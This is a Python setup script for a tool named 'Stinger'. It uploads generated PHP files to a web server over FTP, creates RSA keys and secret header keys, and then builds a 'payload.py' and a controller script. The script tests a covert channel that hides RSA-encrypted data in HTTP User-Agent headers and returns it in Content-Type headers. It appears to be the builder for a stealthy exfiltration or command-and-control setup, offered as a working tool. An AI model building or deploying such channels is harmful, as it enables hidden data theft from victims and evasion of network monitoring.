# Setup Stinger

# Libraries
import ftplib, argparse, os, requests, rsa, threading, random, string
from jinja2 import Environment, FileSystemLoader

# Parser Initialization
parser = argparse.ArgumentParser()

# Website Arguments
parser.add_argument("-site", help="Website Address", required=True)
parser.add_argument("-ssl", help="Site SSL Encryption Set (True/False)", required=False, default=True)

# FTP Arguments
parser.add_argument("-ftp", "--ftpServer", help="FTP Server Address", required=True)
parser.add_argument("-ftpu", "--ftpUser", help="FTP Username", required=True)
parser.add_argument("-ftpp", "--ftpPass", help="FTP Password", required=True)
parser.add_argument("-port", "--ftpPort" ,help="FTP Port", required=False, type=int, default=21)
parser.add_argument("-path", "--ftpPath" ,help="FTP Path", required=False)

# MySQL Arguments
parser.add_argument("-sql", "--sqlHost", help="MySQL Host", required=True)
parser.add_argument("-sqlu", "--sqlUser", help="MySQL Username", required=True)
parser.add_argument("-sqlp", "--sqlPass", help="MySQL Password", required=True)
parser.add_argument("-sqln", "--sqlName", help="MySQL Name", required=True)
 
# Read arguments from command line
args = parser.parse_args()

try:
    # Print Banner
    print(''' 
  ____  _   _                       
 / ___|| |_(_)_ __   __ _  ___ _ __ 
 \___ \| __| | '_ \ / _` |/ _ \ '__|
  ___) | |_| | | | | (_| |  __/ |   
 |____/ \__|_|_| |_|\__, |\___|_|   
                    |___/            ''')
    
    print("Starting Stinger Setup...")
    # FTP Connection
    ftpServer = ftplib.FTP()
    ftpServer.connect(args.ftpServer, args.ftpPort)
    ftpServer.login(args.ftpUser, args.ftpPass)
    print("Connected to FTP Server")
    if args.ftpPath:
        ftpServer.cwd(args.ftpPath)
        
    # Database Variables
    print("Generating Variables & Keys")
    tableName = random.choice(string.ascii_letters) + (os.urandom(16).hex())
    tableID = random.choice(string.ascii_letters) + (os.urandom(16).hex())
    tableBegin = int(str(os.urandom(6).hex()), 16)
    # Key Generation
    armageddonKey = os.urandom(16).hex()
    postKey = "key/" + os.urandom(16).hex()
    getKey = "key/" + os.urandom(16).hex()
    # RSA Key Generation
    (publicKey, privateKey) = rsa.newkeys(1024)
    
    # Jinja2 Server Side File Creation
    env = Environment(
        loader=FileSystemLoader("./templates"),
    )
    
    # Creating Server Side Files
    print("Creating Server Files")
    
    # Create index.php   
    def createIndex(): 
        indexTemplate = env.get_template("index.md")
        renderIndex = indexTemplate.render(postKey=postKey, getKey=getKey, table=tableName, 
                                        tableBegin=tableBegin, tableID=tableID, armageddonKey=armageddonKey)
        with open(f"index.php","w") as file:
            file.write(renderIndex)
        file.close()
    
    # Create config.php
    def createConfig():
        configTemplate = env.get_template("config.md")
        renderConfig = configTemplate.render(sqlHost=args.sqlHost, sqlUser=args.sqlUser, 
                                            sqlPass=args.sqlPass, sqlName=args.sqlName)
        with open(f"config.php","w") as file:
            file.write(renderConfig)
        file.close()
        
    # Threading for Server Side File Creation
    indexThread = threading.Thread(target=createIndex)
    configThread = threading.Thread(target=createConfig)
    
    indexThread.start()
    configThread.start()
    
    indexThread.join()
    configThread.join()
    
    # Store files in FTP
    ftpServer.storbinary("STOR index.php", open(f"index.php", "rb"))
    ftpServer.storbinary("STOR config.php", open(f"config.php", "rb"))
    
    # Quit FPT Connection
    ftpServer.quit()
    
    # Test Stinger
    print("Testing Stinger...")
    
    # Testing random data
    testData = os.urandom(16).hex().encode()
    testDataEnc = rsa.encrypt(testData, publicKey).hex()
    postHeader = {"Accept": postKey, "User-Agent": testDataEnc}
    getHeader = {"Accept": getKey}
    
    # Check website argument format
    if((("http://www." in args.site and args.ssl.upper() == "FALSE"))
    or ("https://www." in args.site)):
        website = args.site
    elif("http://" in args.site and "www." not in args.site and args.ssl.upper() == "FALSE"):
        website = "http://www." + args.site.split("http://")[1]
    elif("https://" in args.site and "www." not in args.site and args.ssl.upper() == "TRUE"):
        website = "https://www." + args.site.split("https://")[1]
    elif("http://" not in args.site and "www." in args.site and args.ssl.upper() == "FALSE"):
        website = "http://www." + args.site.split("www.")[1]
    elif("https://" not in args.site and "www." in args.site and args.ssl.upper() == "TRUE"):
        website = "https://www." + args.site.split("www.")[1]
    elif("https://www." not in args.site and args.ssl.upper() == "TRUE"):
        website = "https://www." + args.site
    else:
        website = "http://www." + args.site

    # Send get request to init table
    request = requests.get(website)
    
    if(request.status_code == 200):
        print("Connected to website")
        # Send Post Request
        request = requests.post(website, headers=postHeader) 
        if(request.status_code == 200):
            # Send Get Request
            request = requests.get(website, params={tableID:tableBegin} ,headers=getHeader) 
            if(request.status_code == 200):
                # Get data and decrypt
                requestData = bytearray.fromhex(request.headers.get("Content-Type"))
                requestData = rsa.decrypt(requestData, privateKey)
                #  Check if test passed
                if (requestData == testData):
                    print("Test successful")
                else:
                    print("Failed Test")   
                    exit(1)
            else:
                print("Failed to send Get request")
                exit(1)
        else:
            print("Failed to send Post request")
            exit(1)
    else:
        print("Failed to connect to website")
        exit(1)
    
    # Create Stinger
    def createStinger():
        print("Creating Stinger & Payload")
        stingerTemplate = env.get_template("stinger.md")
        renderStinger = stingerTemplate.render(getKey=getKey, tableBegin=tableBegin , website=website, 
                                            tableID=tableID, armageddonKey=armageddonKey, 
                                            privateKey=privateKey)
        with open(f"stinger.py","w") as file:
            file.write(renderStinger)
        file.close()
    
    # Create Payload
    def createPayload():
        payloadTemplate = env.get_template("payload.md")
        renderPayload = payloadTemplate.render(postKey=postKey, website=website, publicKey=publicKey)
        with open(f"payload.py","w") as file:
            file.write(renderPayload)
        file.close()
    
    # Threading for Script Creation
    payloadThread = threading.Thread(target=createPayload)
    stingerThread = threading.Thread(target=createStinger)
    
    payloadThread.start()
    stingerThread.start()
    
    payloadThread.join()
    stingerThread.join()
    
    # Delete local files
    os.remove("index.php")
    os.remove("config.php")
    print("Stinger Setup Complete")
    
except Exception as e:
    print("Error : " + str(e))
    exit(1)
